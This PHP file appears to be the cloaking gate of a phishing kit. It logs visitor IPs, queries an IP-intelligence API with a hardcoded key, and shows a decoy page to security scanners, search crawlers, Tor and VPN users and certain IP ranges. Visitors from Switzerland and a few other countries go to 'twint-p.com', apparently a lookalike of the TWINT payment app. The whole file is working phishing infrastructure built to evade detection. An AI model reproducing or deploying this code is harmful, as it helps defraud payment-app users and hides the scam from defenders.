<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}


$ipComponents = explode('.', $ip);
$ipInRange = false;

// Checking if the IP is within the specified range
if ($ipComponents[0] == '20' && $ipComponents[1] == '203' && $ipComponents[2] == '218') {
    $lastComponent = (int)$ipComponents[3];
    if ($lastComponent >= 11 && $lastComponent <= 99) {
        $ipInRange = true;
    }
}

// Including 'pos.html' if IP is in range
if ($ipInRange) {
    include('pos.html');
    exit();
}

	
$key = "74a6f8e52b45260d932a51c24025bfe3f4261e97512b8d401eff94d1";
$country = '"country_code": "CH"';
$country2 = '"country_code": "DD"';
$country3 = '"country_code": "MA"';

date_default_timezone_set('GMT');$TIME = date("d-m-Y H:i:s");$phile = fopen("VISITA.txt","a");
$abi = file_get_contents("https://api.ipdata.co/$ip?api-key=$key");
$anti = array('"name": "Google"', '"domain": "google.com"', '"name": "Eviden AG"', '"domain": "bull-services.ch"','"name": "Amazon"', '"domain": "amazon.com"', '"domain": "amazon.de"', '"name": "t-online"', '"domain": "t-online.de"', '"domain": "avast.com"', '"domain": "versatel.de"', '"domain": "bisping.de"');
$arri = array('"is_tor": true', '"is_vpn": true', '"is_icloud_relay": tue', '"is_known_attacker": true', '"is_known_abuser": true', '"is_threat": true', '"is_bogon": true');
$arr = array_merge($arri, $anti);
$results = array();

foreach ($arr as $value) {

  if (strpos($abi, $value) !== false) { $results[] = $value; }

}
$obj = json_decode($abi);
$count = $obj->country_name;
if(empty($results) && strpos($abi, $country) !== false or  empty($results) && strpos($abi, $country2) !== false or empty($results) && strpos($abi, $country3) !== false) { 
fwrite($phile,$ip." - ".$TIME." $count -- REDIRECTED \n");
header("Location: https://twint-p.com/update/815442/?628552");exit();
}else {if (empty($results)){$coun = "NOT FROM $country";} 
$DATA = "BL0CK3D: " . implode('; ', $results). " $coun";
fwrite($phile,$ip." - ".$TIME." $count -- $DATA \n") ;
include('pos.html');exit();
}
?>